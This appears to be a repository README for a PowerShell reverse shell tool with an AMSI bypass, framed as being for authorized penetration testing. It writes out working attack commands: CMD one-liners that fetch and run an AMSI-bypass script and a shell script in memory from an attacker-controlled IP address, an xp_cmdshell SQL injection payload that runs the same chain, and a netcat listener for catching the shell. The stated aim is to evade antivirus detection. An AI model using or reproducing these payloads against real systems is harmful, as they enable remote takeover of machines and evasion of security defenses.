# PowerShell Reverse Shell with AMSI Bypass

This repository contains a PowerShell script to establish a reverse shell connection while bypassing AMSI (Antimalware Scan Interface) to evade detection by antivirus software. The script is designed for educational purposes and penetration testing in authorized environments.

---

## Table of Contents
1. [Description](#description)
2. [Requirements](#requirements)
3. [Usage](#usage)
4. [How It Works](#how-it-works)
5. [Why Linkin Park?](#why-linkin-park)
6. [Disclaimer](#disclaimer)

---

## Description

This project demonstrates how to:
1. Bypass AMSI to disable antivirus detection.
2. Download and execute a PowerShell reverse shell script from a remote server.
3. Establish a reverse shell connection to a specified IP and port.

The repository includes:
- `amsi.txt`: A script to bypass AMSI.
- `shell.ps1`: A PowerShell reverse shell script.

---

## Requirements

To use this project, you need:
- A Windows machine with PowerShell installed.
- A remote server to host the `amsi.txt` and `shell.ps1` files (e.g., a Python HTTP server).
- A listener on the attacker's machine to receive the reverse shell connection (e.g., `netcat`).

---

## Usage

### 1. Set Up the HTTP Server
Host the `amsi.txt` and `shell.ps1` files on a remote server. You can use a Python HTTP server for this:

```bash
python -m http.server 8000
```

### 2. Start a Listener
On the attacker's machine, start a listener to receive the reverse shell connection:

```bash
rlwrap -cAr nc -lvp 443
```

### 3. Execute the Payload

#### **From the Target Machine (CMD)**:
On the target machine, run the following command in CMD:

```cmd
powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.94/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent"

or this one:
powershell -nop -ep Bypass -c "iex (iwr 'http://192.168.1.94/amsi.txt' -UseBasicParsing).Content; $s=[Text.Encoding]::UTF8.GetString((iwr 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); iex $s"

```

Replace `192.168.1.94` with the IP address of your HTTP server.

---

#### **From an SQL Injection (Burp Suite)**:
If you have an SQL Injection vulnerability where you can execute commands using `xp_cmdshell`, run the following command from Burp Suite:

```sql
parameter=test'; EXEC xp_cmdshell 'powershell IEX (Invoke-WebRequest -Uri \"http://192.168.1.94/amsi.txt\" -UseBasicParsing).RawContent ; $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri \"http://192.168.1.94/shell.ps1\" -UseBasicParsing).Content); Invoke-Expression $scriptContent';--
```

**Steps**:
1. Replace `http://192.168.1.95` with the IP address of your HTTP server.
2. Convert the command to URL encoding using **Ctrl + U** in Burp Suite.
3. Send the request to execute the payload.

---

## How It Works

1. **AMSI Bypass**:
   - The `amsi.txt` script disables AMSI, allowing the execution of scripts that would otherwise be blocked by antivirus software.

2. **Reverse Shell**:
   - The `shell.ps1` script establishes a TCP connection to the attacker's machine and provides an interactive shell.

3. **Remote Execution**:
   - The payload is downloaded and executed directly in memory, reducing the chances of detection by endpoint protection tools.

---

## Why Linkin Park?

The variables in the `shell.ps1` script are named after members of the band **Linkin Park** as a tribute to their music and legacy. Here's the breakdown:
- `$chester`: Chester Bennington, the iconic lead vocalist.
- `$mike`: Mike Shinoda, the band's co-lead vocalist, rapper, and multi-instrumentalist.
- `$shinoda`: Another nod to Mike Shinoda.
- `$bennington`: Chester Bennington's last name.
- `$hahn`: Joe Hahn, the band's DJ and creative director.
- `$phoenix`: Phoenix Farrell, the bassist.
- `$bourdon`: Rob Bourdon, the drummer.

This naming convention adds a personal touch to the script while maintaining its functionality.

---

## Disclaimer

This project is intended for educational and authorized penetration testing purposes only. Do not use this tool for illegal or malicious activities. The author is not responsible for any misuse of this software. Always ensure you have proper authorization before using this tool in any environment.
